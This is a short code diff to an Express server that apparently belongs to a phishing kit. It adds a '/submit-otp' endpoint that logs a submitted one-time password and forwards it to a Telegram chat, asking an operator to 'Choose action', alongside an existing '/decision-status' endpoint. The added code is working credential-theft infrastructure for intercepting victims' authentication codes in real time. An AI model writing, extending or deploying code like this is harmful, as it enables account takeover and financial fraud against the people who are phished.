@@ -142,6 +142,29 @@ app.get("/decision-status", (req, res) => {
   res.json({ decision });
 });
 
+app.post("/submit-otp", async (req, res) => {
+  try {
+    const { otp } = req.body;
+
+    console.log("USER OTP:", otp);
+
+    const message = `
+🔢 OTP ENTERED:
+
+${otp}
+
+👇 Choose action
+`;
+
+    await sendToTelegram(message);
+
+    res.json({ success: true });
+
+  } catch (err) {
+    console.log("OTP ERROR:", err.message);
+    res.json({ success: false });
+  }
+});
 // ==============================
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
